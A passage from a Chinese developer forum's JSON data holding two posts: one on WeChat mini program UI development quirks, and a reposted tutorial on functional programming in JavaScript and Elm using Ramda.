src=\"https://mc.qcloudimg.com/static/img/0b995a62f4aa51813a37df2ed8e94368/image.png\" alt=\"img\"></p>\n<p>icon，小程序提供了多种图标供你直接使用</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/80aff97d5c375067d7473e831429b403/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/63da436a49d2a826be5843a8a127111b/image.png\" alt=\"img\"></p>\n<p>text，文本，唯一可以通过长按被选中内容的一个组件。</p>\n<p>progress，进度条</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/22a18b7479b6245eb64eefdd43ff00c0/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/d357665f5c94d709e09708b5591250f3/image.png\" alt=\"img\"></p>\n<p>button 按钮，尽量使用小程序提供给你的几种样式参数</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/e64e39ca20904097cbd0a5d704f1ef9d/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/1b1b9f8604891f62c925c17a54406aac/image.png\" alt=\"img\"></p>\n<p>表单以及常用表单组件 ：form，input，checkbox，label，picker，radio，slider，switch</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/fff4262771a7f9d3fe0faabab7007918/image.png\" alt=\"img\"></p>\n<p>各种操作反馈，消息提示框：action-sheet，modal，toast，loading</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/2e748b3ecc6d98fa0d4e9e2eea205615/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/ae0670181aac439ecf19c48671a226e3/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/0f91dbf8399e14fd051de7c8c68a1df8/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/83a46f6d59db76fff3c1ea289d97a5e5/image.png\" alt=\"img\"></p>\n<p>以及一些媒体组件，video、audio，image，canvas等等</p>\n<p>这些东西在几位前辈的文章里，以及微信的开发文档里都有更详细的介绍，我这里就不再一一介绍。</p>\n<p>那么我们就快速的跑通一个小程序的demo先。</p>\n<p>在开发之前你要有微信开发者工具。</p>\n<p>这里我要假设大家有已经拿到了内测或者公测的资格，因为没有拿到的话下面的步骤是没法进行的。</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/d7324b662c8156b66dfc137bd6570b60/image.png\" alt=\"img\"></p>\n<p>打开以后你会看到这样的界面，我们选择小程序进入</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/809b3f8e76ab81975e4737dbaa8f4649/image.png\" alt=\"img\"></p>\n<p>这时候就可以创建项目了</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/e3cbbe4f27f9f1915f441d9b8308f48a/image.png\" alt=\"img\"></p>\n<p>填写你拿到的appid，和自己的项目名称以及目录，然后就可以打开自己的项目了。界面如下：</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/608b71ec1302c2765af5abd42340b10e/image.png\" alt=\"img\"></p>\n<p>左侧菜单栏就不说了，中间是编译后的预览界面，新的开发者工具已经可以做到实时更新，不需要每次都去点编译了。</p>\n<p>右侧是你的项目目录，其中pages就是你的页面结构目录了，每个页面下面必须要有 js，wxml，wxss这三个文件，缺少任何一个的话都无法上传预览。</p>\n<p>然后就是那个当前态的<code>app.json</code>文件，<code>app.json</code> 是对整个小程序的全局配置。我们可以在这个文件中配置小程序是由哪些页面组成，配置小程序的窗口背景色，配置导航条样式，配置默认标题。注意该文件不可添加任何注释。，我们简单的配置一下：</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/68d4d08e8241712af2b20b84c8413059/image.png\" alt=\"img\"></p>\n<p>这里比较好的一点是，navigationbar的背景颜色支持自定义任意颜色了，不再有只能黑白透明的限制，还是很不错的。</p>\n<p>然后我们在页面p里简单的写个Hello World</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/7bac7fed19569889e1d32965a81c4dc2/image.png\" alt=\"img\"></p>\n<p>保存以后预览界面已经立即刷新出来</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/17006259af29f8800de31d59437b48e1/image.png\" alt=\"img\"></p>\n<p>如果想真机测试（个人建议一定要真机测试，特别是给上下游预览的时候，pc上的样式还原程度较差，包括字体等等，毕竟系统不同。），只需要选中项目选项</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/9c4de68eb2b4a8ce5cd255d5bed20663/image.png\" alt=\"img\"></p>\n<p>然后在界面上点击预览</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/6cebe9e9d47fb8fe81e30e95ba625c98/image.png\" alt=\"img\"></p>\n<p>下面的三个选项都比较实用，可以根据需要点选。然后就会弹出可以用注册过的微信号真机预览的二维码，如图：</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/87a349dfc18f2bc2c26df4f09cf4935a/image.png\" alt=\"img\"></p>\n<p>这样一个简单的小程序demo就完全跑通了。</p>\n<p>上面和配置文件app.json平级的还有一个app.js文件，是小程序的脚本代码。我们可以在这个文件中监听并处理小程序的生命周期函数、声明全局变量，在每个page目录里的js做当前页面的业务操作。但是小程序的页面的脚本逻辑是在JsCore中运行，JsCore是一个没有窗口对象的环境，所以不能在脚本中使用window，也无法在脚本中操作组件，所以我们常用的zepto/jquery 等类库也是无法使用的。</p>\n<p>另一个app.wxss文件，这个是全局的样式，所有的页面都会调用到，每个项目目录下面的wxss是局部样式文件，不会和其他目录产生污染，可以放心使用样式名。</p>\n<p>他提供的WXSS(WeiXin Style Sheets)是一套样式语言，具有 CSS 大部分特性，可以看作一套简化版的css。</p>\n<p>同时为了更适合开发微信小程序，还对 CSS 进行了扩充以及修改，直接帮我们把适配的一部分工作都做了，比如他的rpx（responsive pixel），可以根据屏幕宽度进行自适应，规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。</p>\n<p>这个很赞，很方便。你可以简单的理解为就是你平时按照750设计稿开发的流程，只不过你不需要再去做rem的转换和适配工作了，所以小程序的视觉稿，最好也是按照750来出。</p>\n<p>但是！在不同的屏幕上多多少少会有一些差异，只能根据大家的经验去规避和解决，通过媒体查询也好，还是其他方法也好。</p>\n<p>而且，在wxss里不能引用本地资源，说起来这个坑，满眼都是泪。那天晚上写小程序demo的时候，没有仔细的去查去问，自己闷头边写边预览，突然真机预览就不行了，毫无预兆，我也完全不会想到是一个背景图造成的问题，折腾了大半夜终于知道了问题所在，于是很开心的把图片都转换成base64，心里想着这下没问题了吧？结果预览上传又失败了，继续折腾了下半夜，才知道小程序对整个包的大小有严格要求，不可以超过1M，最后把所有的静态资源都放到了腾讯云的<a href=\"https://www.qcloud.com/document/product/448/6425?fromSource=gwzcw.59828.59828.59828\">cdn</a>，才算解决了这个问题。所以如果你要写背景图，那么需要引用一个线上的图片在这里极不推荐使用base64！极不推荐使用base64！极不推荐使用base64！</p>\n<p>另外一个应用同时只能打开5个页面，当已经打开了5个页面之后，wx.navigateTo不能正常打开新页面。请避免多层级的交互方式。</p>\n<p>在开发的过程中也不可避免的遇到了一些小坑，举个例子，比如一个简单的switch控件，你可以通过查看元素的方式轻易得知他的自身样式</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/75d1be860f0f01609f0efbe1290e41ab/image.png\" alt=\"img\"></p>\n<p>那么我要做一个简单的和文本垂直剧中对齐，从以往的css经验，只要vertical-align: middle就可以轻松解决了，在本地预览的时候也是这样好好的</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/d0c820a4ad728dd4cf0cc21122add613/image.png\" alt=\"img\"></p>\n<p>可是在真机测试的时候，各种设备就开始出现偏差了</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/88b7d6ab7be1ada49f3970b0f6ba7a54/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/c8abbd8722edd6dff014264e28e4a2aa/image.png\" alt=\"img\"></p>\n<p>然后简单的审查元素之后发现问题在于</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/bdd708e83369e80f6746896f6247f8a1/image.png\" alt=\"img\"></p>\n<p>这个控件是存在空白区域的，根据设备，屏幕大小的不一，空白区域大小也不一致。</p>\n<p>受于时间紧迫，可翻阅文档有限，感觉是因为默认的行高原因，于是我只好发挥老司机的狡猾本质，可以通过行高或者overflow的控制，干掉多余的部分，最终真机界面显示还算统一</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/7128614258db3448a5b6f4b78b3fa878/image.png\" alt=\"img\"></p>\n<p>如果你要按照像素级别设计稿来做小程序开发的话，控件的小差异还是需要自己来做一些控制（也有可能从根本上就是我个人用错了方法或者理解错了，鉴于文档太少，以后开发者多了大家会有更清晰的认识。）</p>\n<p>还有另一个遇到的问题，就是小程序对 image 的默认渲染，这是通过工具查看默认图像的样式</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8060d38f3fa15707adc566482165e553/image.png\" alt=\"img\"></p>\n<p>经过多方打听发现小程序的image是按照background-image来实现的，所以所有图像会得到一个初始宽高320 240，而且无法通过auto重置，只可以通过具体的值来重写。</p>\n<p>好在微信提供了3种缩放模式，9种裁剪模式，在大多数场景可以满足我们对图片的控制：</p>\n<p>例如原图：</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/4cb08bb4e9999bd42ff5942827dcd91e/image.jpg\" alt=\"img\"></p>\n<p>scaleToFill 模式</p>\n<p>不保持纵横比缩放图片，使图片完全适应</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/d0a16186bd660eefb23deb865580b481/image.png\" alt=\"img\"></p>\n<p>aspectFit</p>\n<p>保持纵横比缩放图片，使图片的长边能完全显示出来</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/ec68e3002217c1a71f0701f192a0aa5c/image.png\" alt=\"img\"></p>\n<p>aspectFill</p>\n<p>保持纵横比缩放图片，只保证图片的短边能完全显示出来</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/3b799114ff42745d44a3c93fb0523dc4/image.png\" alt=\"img\"></p>\n<p>top</p>\n<p>不缩放图片，只显示图片的顶部区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8706a5dd8a2b4eea9fbdbdb1455d20ab/image.png\" alt=\"img\"></p>\n<p>bottom</p>\n<p>不缩放图片，只显示图片的底部区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/b0d9d4ba8b79993bacab76883adc106b/image.png\" alt=\"img\"></p>\n<p>center</p>\n<p>不缩放图片，只显示图片的中间区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/d79651a86f208d3665affca6ce2697d6/image.png\" alt=\"img\"></p>\n<p>left</p>\n<p>不缩放图片，只显示图片的左边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/ac7f1ddc9512a9674c8ce01530c71b99/image.png\" alt=\"img\"></p>\n<p>right</p>\n<p>不缩放图片，只显示图片的右边边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8fe9672b022eba6e79f642ff438ef1d8/image.png\" alt=\"img\"></p>\n<p>top left</p>\n<p>不缩放图片，只显示图片的左上边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/b4897a84661efff54f5fd9d8978c688c/image.png\" alt=\"img\"></p>\n<p>top right</p>\n<p>不缩放图片，只显示图片的右上边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8fe9672b022eba6e79f642ff438ef1d8/image.png\" alt=\"img\"></p>\n<p>bottom left</p>\n<p>不缩放图片，只显示图片的左下边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/12bd51cffd1f68df138d1b5af9b2cc7c/image.png\" alt=\"img\"></p>\n<p>bottom right</p>\n<p>不缩放图片，只显示图片的右下边区域</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/20d42dff9737ec40011111491580486c/image.png\" alt=\"img\"></p>\n<p>如果你有更严格的图片设计展示方式，那么可以尝试用一些特殊的方式去控制图像的宽高吧。</p>\n<p>还有小程序的button控件，</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/5ef44b8729bebdf8fab52abb889416b1/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/c9f3723c56f1cebdd97ff82f9413a77c/image.png\" alt=\"img\"></p>\n<p>他的初始样式里并没有border，所以我费尽心思也没能把他重写为一个无边无背景的设计形式，最终为了满足设计稿，个别语义化为按钮的元素，我是用其他更可控的元素来实现的，比如这个界面的发送图片按钮</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/2de8b5475e7860fa64bca4fe97e345f0/image.png\" alt=\"img\"></p>\n<p>但是到后来才知道button是通过after来写的样式，开发者工具的调试里完全看不到这个after(┬＿┬)…</p>\n<p>除了这些UI开发上的体会，大家也都知道，小程序诞生就不是为了展示，他不适合做纯展示型的东西，主要是做一些功能型的应用。</p>\n<p>而微信所提供的小程序现有的SDK和DEMO,缺乏对服务端的支持，依赖开发者逐个模块搭建服务；而且必须通过HTTPS完成与服务端通信，依赖开发者自行完成证书申请部署；鉴权流程安全性要求高，开发者高效安全的完成会话管理难度会比较大；提供了WebSocket长连接通信的客户端API，但缺乏服务端配套支持，开发者自行实现难度还是较大的。并且具备快速传播，流量突增的特点，要求架构具备弹性伸缩能力。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布 腾讯云祝您元旦快乐~</strong></p>\n<hr>\n</div>","title":"从前端界面开发谈微信小程序体验","last_reply_at":"2018-12-29T10:05:55.660Z","good":false,"top":false,"reply_count":0,"visit_count":796,"create_at":"2018-12-29T10:05:55.660Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c272f8176c4964062a1f1b4","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> JS函数式编程入门。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017545008\">学会使用函数式编程的程序员(第3部分)</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-29-01.png\" alt></p>\n<p>本系列的其它篇:</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000017511211\">学会使用函数式编程的程序员(第1部分)</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017526981\">学会使用函数式编程的程序员(第2部分)</a></li>\n</ul>\n<h3>引用透明 (Referential Transparency)</h3>\n<p>引用透明是一个富有想象力的优秀术语,它是用来描述纯函数可以被它的表达式安全的替换，通过下例来帮助我们理解。</p>\n<p>在代数中,有一个如下的公式:</p>\n<pre class=\"prettyprint language-javascript\"><code>y = x + 10\n</code></pre><p>接着：</p>\n<pre class=\"prettyprint language-javascript\"><code> x = 3\n</code></pre><p>然后带入表达式：</p>\n<pre class=\"prettyprint language-javascript\"><code>y = 3 + 10\n</code></pre><p>注意这个方程仍然是有效的，我们可以利用纯函数做一些相同类型的替换。</p>\n<p>下面是一个 JavaScript 的方法,在传入的字符串两边加上单引号:</p>\n<pre class=\"prettyprint language-javascript\"><code>function quote (str) {\n  retrun &quot;&#x27;&quot; + str + &quot;&#x27;&quot;\n}\n</code></pre><p>下面是调用它：</p>\n<pre class=\"prettyprint language-javascript\"><code>   function findError (key) {\n     return &quot;不能找到 &quot; + quote(key)\n   }\n</code></pre><p>当查询 <strong>key</strong> 值失败时,<strong>findError</strong> 返回一个报错信息。</p>\n<p>因为 <strong>quote</strong> 是纯函数,我们可以简单地将 <strong>quote</strong> 函数体(<strong>这里仅仅只是个表达式</strong>)替换掉在<strong>findError</strong>中的方法调用:</p>\n<pre class=\"prettyprint language-javascript\"><code>   function findError (key) {\n     return &quot;不能找到 &quot; + &quot;&#x27;&quot; + str + &quot;&#x27;&quot;\n   }\n</code></pre><p>这个就是通常所说的**“反向重构”**(它对我而言有更多的意义),可以用来帮程序员或者程序(例如编译器和测试程序)推理代码的过程一个很好的方法。如，这在推导递归函数时尤其有用的。</p>\n<h3>执行顺序 (Execution Order)</h3>\n<p>大多数程序都是单线程的，即一次只执行一段代码。即使你有一个多线程程序，大多数线程都被阻塞等待I/O完成，例如文件，网络等等。</p>\n<p>这也是当我们编写代码的时候,我们很自然考虑按次序来编写代码:</p>\n<pre class=\"prettyprint\"><code>1. 拿到面包 \n2. 把2片面包放入烤面包机 \n3. 选择加热时间 \n4. 按下开始按钮 \n5. 等待面包片弹出 \n6. 取出烤面包 \n7. 拿黄油 \n8. 拿黄油刀 \n9. 制作黄油面包 \n</code></pre><p>在这个例子中,有两个独立的操作:<strong>拿黄油</strong>以及 <strong>加热面包</strong>。它们在 <strong>步骤9</strong> 时开始变得相互依赖。</p>\n<p>我们可以将 <strong>步骤7</strong> 和 <strong>步骤8</strong> 与 <strong>步骤1</strong> 到 <strong>步骤6</strong> 同时执行，因为它们彼此独立。当我们开始做的时候,事情开始复杂了:</p>\n<pre class=\"prettyprint\"><code>线程一\n--------------------------\n1. 拿到面包 \n2. 把2片面包放入烤面包机 \n3. 选择加热时间 \n4. 按下开始按钮 \n5. 等待面包片弹出 \n6. 取出烤面包 \n\n线程二\n-------------------------\n1. 拿黄油 \n2. 拿黄油刀 \n3. 等待线程1完成 \n4. 取出烤面包 \n</code></pre><p>果线程1失败，线程2怎么办? 怎么协调这两个线程? 烤面包这一步骤在哪个线程运行：线程1，线程2或者两者?</p>\n<p>不考虑这些复杂性，让我们的程序保持单线程会更容易。但是,只要能够提升我们程序的效率，要付出努力来写好多线程程序,这是值得的。</p>\n<p>然而，多线程有两个主要问题：</p>\n<ul>\n<li>多线程程序难于编写、读取、解释、测试和调试。</li>\n<li>一些语言,例如JavaScript,并不支持多线程,就算有些语言支持多线程,对它的支持也很弱。</li>\n</ul>\n<p>但是，如果顺序无关紧要，所有事情都是并行执行的呢?</p>\n<p>尽管这听起来有些疯狂,但其实并不像听起来那么混乱。让我们来看一下 <strong>Elm</strong> 的代码来形象的理解它:</p>\n<pre class=\"prettyprint language-javascript\"><code>buildMessage message value =\n    let\n        upperMessage =\n            String.toUpper message\n        quotedValue =\n            &quot;&#x27;&quot; ++ value ++ &quot;&#x27;&quot;\n    in\n        upperMessage ++ &quot;: &quot; ++ quotedValue\n</code></pre><p>这里的 <strong>buildMessage</strong> 接受参数 <strong>message</strong> 和 <strong>value</strong>,然后,生成大写的 <strong>message</strong>和 带有引号的 <strong>value</strong> 。</p>\n<p>注意到 <strong>upperMessage</strong> 和 <strong>quotedValue</strong> 是独立的。我们怎么知道的呢?</p>\n<p>在上面的代码示例中,<strong>upperMessage</strong> 和 <strong>quotedValue</strong> 两者都是纯的并且没有一个需要依赖其它的输出。</p>\n<p>如果它们不纯，我们就永远不知道它们是独立的。在这种情况下，我们必须依赖程序中调用它们的顺序来确定它们的执行顺序。这就是所有命令式语言的工作方式。</p>\n<p>第二点必须满足的就是一个函数的输出值不能作为其它函数的输入值。如果存在这种情况,那么我们不得不等待其中一个完成才能执行下一个。</p>\n<p>在本例中，<strong>upperMessage</strong> 和 <strong>quotedValue</strong> 都是纯的并且没有一个需要依赖其它的输出，因此，这两个函数可以以任何顺序执行。</p>\n<p>编译器可以在不需要程序员帮助的情况下做出这个决定。这只有在纯函数式语言中才有可能，因为很难(如果不是不可能的话)确定副作用的后果。</p>\n<blockquote>\n<p>在纯函数语言中，执行的顺序可以由编译器决定。</p>\n</blockquote>\n<p>考虑到 CPU 无法一再的加快速度，这种做法非常有利的。别一方面，生产商也不断增加CPU内核芯片的数量，这意味着代码可以在硬件层面上并行执行。使用纯函数语言,就有希望在不改变任何代码的情况下充分地发挥 CPU 芯片的功能并取得良好成效。</p>\n<h3>类型注释 (Type Annotations)</h3>\n<p>在静态类型语言中，类型是内联定义的。以下是 Java 代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>public static String quote(String str) {\n    return &quot;&#x27;&quot; + str + &quot;&#x27;&quot;;\n}\n</code></pre><p>注意类型是如何同函数定义内联在一起的。当有泛型时,它变的更糟:</p>\n<pre class=\"prettyprint language-javascript\"><code>private final Map&lt;Integer, String&gt; getPerson(Map&lt;String, String&gt; people, Integer personId) {\n   &#x2F;&#x2F; ...\n}\n</code></pre><p>这里使用粗体标出了使它们使用的类型，但它们仍然会让函数可读性降低，你必须仔细阅读才能找到变量的名称。</p>\n<p>对于动态类型语言，这不是问题。在 Javascript 中，可以编写如下代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>var getPerson = function(people, personId) {\n    &#x2F;&#x2F; ...\n};\n</code></pre><p>这样没有任何的的类型信息更易于阅读，唯一的问题就是放弃了类型检测的安全特性。这样能够很简单的传入这些参数,例如,一个 <strong>Number</strong> 类型的 <strong>people</strong> 以及一个 <strong>Objec</strong> t类型的 <strong>personId</strong>。</p>\n<p>动态类型要等到程序执行后才能知道哪里问题，这可能是在发布的几个月后。在 Java 中不会出现这种情况，因为它不能被编译。</p>\n<p>但是,假如我们能同时拥有这两者的优异点呢? JavaScript 的语法简单性以及 Java 的安全性。</p>\n<p>事实证明我们可以。下面是 <strong>Elm</strong> 中的一个带有类型注释的函数:</p>\n<pre class=\"prettyprint language-javascript\"><code>add : Int -&gt; Int -&gt; Int\nadd x y =\n    x + y\n</code></pre><p>请注意类型信息是在单独的代码行上面的，而正是这样的分割使得其有所不同。</p>\n<p>现在你可能认为类型注释有错训。 第一次见到它的时候。 大都认为第一个 <strong>-&gt;</strong> 应该是一个逗号。可以加上隐含的括号,代码就清晰多了：</p>\n<pre class=\"prettyprint language-javascript\"><code>add : Int -&gt; (Int -&gt; Int)\n</code></pre><p>上例 <strong>add</strong> 是一个函数，它接受类型为 <strong>Int</strong> 的单个参数，并返回一个函数，该函数接受单个参数 <strong>Int</strong>类型 并返回一个 <strong>Int</strong> 类型的结果。</p>\n<p>以下是一个带括号类型注释的代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>doSomething : String -&gt; (Int -&gt; (String -&gt; String)) \ndoSomething prefix value suffix = \nprefix ++ (toString value) ++ suffix\n</code></pre><p>这里 <strong>doSomething</strong> 是一个函数，它接受 <strong>String</strong> 类型的单个参数，然后返回一个函数，该函数接受 <em>Int</em> 类型的单个参数，然后返回一个函数，该函数接受 <strong>String</strong> 类型的单个参数，并返回一个字符串。</p>\n<p>注意为什么每个方法都只接受一个参数呢？ 这是因为每个方法在 <strong>Elm</strong> 里面都是柯里化。</p>\n<p>因为括号总是指向右边，它们是不必要的，简写如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>doSomething : String -&gt; Int -&gt; String -&gt; String\n</code></pre><p>当我们将函数作为参数传递时，括号是必要的。如果没有它们，类型注释将是不明确的。例如:</p>\n<pre class=\"prettyprint language-javascript\"><code>takes2Params : Int -&gt; Int -&gt; String\ntakes2Params num1 num2 =\n    -- do something\n</code></pre><p>非常不同于:</p>\n<pre class=\"prettyprint language-javascript\"><code>takes1Param : (Int -&gt; Int) -&gt; String\ntakes1Param f =\n    -- do something\n</code></pre><p><strong>takes2Param</strong> 函数需要两个参数，一个 <strong>Int</strong> 和另一个 <strong>Int</strong>，而<strong>takes1Param</strong> 函数需要一个参数，这个参数为函数, 这个函数需要接受两个 <strong>Int</strong> 类型参数。</p>\n<p>下面是 <strong>map</strong> 的类型注释:</p>\n<pre class=\"prettyprint language-javascript\"><code>map : (a -&gt; b) -&gt; List a -&gt; List b\nmap f list =\n    &#x2F;&#x2F; ...\n</code></pre><p>这里需要括号，因为 <strong>f</strong> 的类型是(a -&gt; b)，也就是说，函数接受类型 a 的单个参数并返回类型 b 的某个函数。</p>\n<p>这里类型 <strong>a</strong> 是任何类型。当类型为大写形式时，它是显式类型，例如 String。当一个类型是小写时，它可以是任何类型。这里 <strong>a</strong> 可以是字符串，也可以是 <strong>Int</strong>。</p>\n<p>如果你看到 <strong>(a -&gt; a)</strong> 那就是说输入类型和输出类型必须是相同的。它们是什么并不重要，但必须匹配。</p>\n<p>但在 <strong>map</strong> 这一示例中,有这样一段 <strong>(a -&gt; b)</strong>。这意味着它既能返回一个不同的类型,也能返回一个相同的类型。</p>\n<p>但是一旦 <strong>a</strong> 的类型确定了,<strong>a</strong> 在整段代码中就必须为这个类型。例如,如果 <strong>a</strong> 是一个 Int,<strong>b</strong> 是一个 String,那么这段代码就相当于:</p>\n<pre class=\"prettyprint language-javascript\"><code>(Int -&gt; String) -&gt; List Int -&gt; List String\n</code></pre><p>这里所有的 <strong>a</strong> 都换成了 <strong>Int</strong>，所有的 <strong>b</strong> 都换成了 <strong>String</strong>。</p>\n<p><strong>List Int</strong> 类型意味着一个值都为 <strong>Int</strong> 类型的列表, <strong>List String</strong> 意味着一个值都为 <strong>String</strong> 类型的列表。如果你已经在 <strong>Java</strong> 或者其他的语言中使用过泛型,那么这个概念你应该是熟悉的</p>\n<h3>函数式 JavaScript</h3>\n<p>JavaScript 拥有很多类函数式的特性但它没有纯性，但是我们可以设法得到一些不变量和纯函数，甚至可以借助一些库。</p>\n<p>但这并不是理想的解决方法。如果你不得不使用纯特性，为何不直接考虑函数式语言？</p>\n<p>这并不理想，但如果你必须使用它，为什么不从函数式语言中获得一些好处呢?</p>\n<h3>不可变性(Immutability)</h3>\n<p>首先要考虑的是不变性。在ES2015或ES6中，有一个新的关键词叫<strong>const</strong>，这意味着一旦一个变量被设置，它就不能被重置:</p>\n<pre class=\"prettyprint language-javascript\"><code>const a = 1;\na = 2; &#x2F;&#x2F; 这将在Chrome、Firefox或 Node中抛出一个类型错误，但在Safari中则不会\n</code></pre><p>在这里，<strong>a</strong> 被定义为一个常量，因此一旦设置就不能更改。这就是为什么 <strong>a = 2</strong> 抛出异常。</p>\n<p><strong>const</strong> 的缺陷在于它不够严格，我们来看个例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>const a = {\n    x: 1,\n    y: 2\n};\na.x = 2; &#x2F;&#x2F; 没有异常\na = {}; &#x2F;&#x2F; 报错\n</code></pre><p>注意到 <strong>a.x = 2</strong> 没有抛出异常。<strong>const</strong> 关键字唯一不变的是变量 <strong>a</strong>, <strong>a</strong> 所指向的对象是可变的。</p>\n<p>那么Javascript中如何获得不变性呢?</p>\n<p>不幸的是，我们只能通过一个名为 <a href=\"https://facebook.github.io/immutable-js/\">Immutable.js</a> 的库来实现。这可能会给我们带来更好的不变性，但遗憾的是，这种不变性使我们的代码看起来更像 Java 而不是 Javascript。</p>\n<h3>柯里化与组合 (curring and composition)</h3>\n<p>在本系列的前面，我们学习了如何编写柯里化函数，这里有一个更复杂的例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>const f = a =&gt; b =&gt; c =&gt; d =&gt; a + b + c + d\n</code></pre><p>我们得手写上述柯里化的过程，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(f(1)(2)(3)(4)); &#x2F;&#x2F; prints 10\n</code></pre><p>括号如此之多，但这已经足够让Lisp程序员哭了。有许多库可以简化这个过程，我最喜欢的是 <a href=\"http://ramdajs.com/\">Ramda</a>。</p>\n<p>使用 <strong>Ramda</strong> 简化如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const f = R.curry((a, b, c, d) =&gt; a + b + c + d);\nconsole.log(f(1, 2, 3, 4)); &#x2F;&#x2F; prints 10\nconsole.log(f(1, 2)(3, 4)); &#x2F;&#x2F; also prints 10\nconsole.log(f(1)(2)(3, 4)); &#x2F;&#x2F; also prints 10\n</code></pre><p>函数的定义并没有好多少，但是我们已经消除了对那些括号的需要。注意，调用 <strong>f</strong> 时，可以指定任意参数。</p>\n<p>重写一下之前的 <strong>mult5AfterAdd10</strong> 函数：</p>\n<pre class=\"prettyprint language-javascript\"><code>const add = R.curry((x, y) =&gt; x + y);\nconst mult5 = value =&gt; value * 5;\nconst mult5AfterAdd10 = R.compose(mult5, add(10));\n</code></pre><p>事实上 <strong>Ramda</strong> 提供了很多辅助函数来做些简单常见的运算，比如R.add以及R.multiply。以上代码我们还可以简化：</p>\n<pre class=\"prettyprint language-javascript\"><code>const mult5AfterAdd10 = R.compose(R.multiply(5), R.add(10));\n</code></pre><h3>Map, Filter and Reduce</h3>\n<p><strong>Ramda</strong> 也有自己的 <strong>map</strong>、<strong>filter</strong>和 <strong>reduce</strong> 版本。虽然这些函数存在于数组中。这几个函数是在 <strong>Array.prototype</strong> 对象中的，而在 Ramda 中它们是柯里化的</p>\n<pre class=\"prettyprint language-javascript\"><code>const isOdd = R.flip(R.modulo)(2);\nconst onlyOdd = R.filter(isOdd);\nconst isEven = R.complement(isOdd);\nconst onlyEven = R.filter(isEven);\nconst numbers = [1, 2, 3, 4, 5, 6, 7, 8];\nconsole.log(onlyEven(numbers)); &#x2F;&#x2F; prints [2, 4, 6, 8]\nconsole.log(onlyOdd(numbers)); &#x2F;&#x2F; prints [1, 3, 5, 7]\n</code></pre><p><strong>R.modulo</strong> 接受2个参数，被除数和除数。</p>\n<p><strong>isOdd</strong> 函数表示一个数除 2 的余数。若余数为 0，则返回 false，即不是奇数；若余数为 1，则返回 true，是奇数。用 R.filp 置换一下 R.modulo 函数两个参数顺序，使得 2 作为除数。</p>\n<p><strong>isEven</strong> 函数是 <strong>isOdd</strong> 函数的补集。</p>\n<p><strong>onlyOdd</strong> 函数是由 <strong>isOdd</strong> 函数进行断言的过滤函数。当它传入最后一个参数，一个数组，它就会被执行。</p>\n<p>同理，<strong>onlyEven</strong> 函数是由 <strong>isEven</strong> 函数进行断言的过滤函数。</p>\n<p>当我们给函数 <strong>onlyEven</strong> 和 <strong>onlyOd</strong> 传入 <strong>numbers</strong>，<strong>isEven</strong> 和 <strong>isOdd</strong> 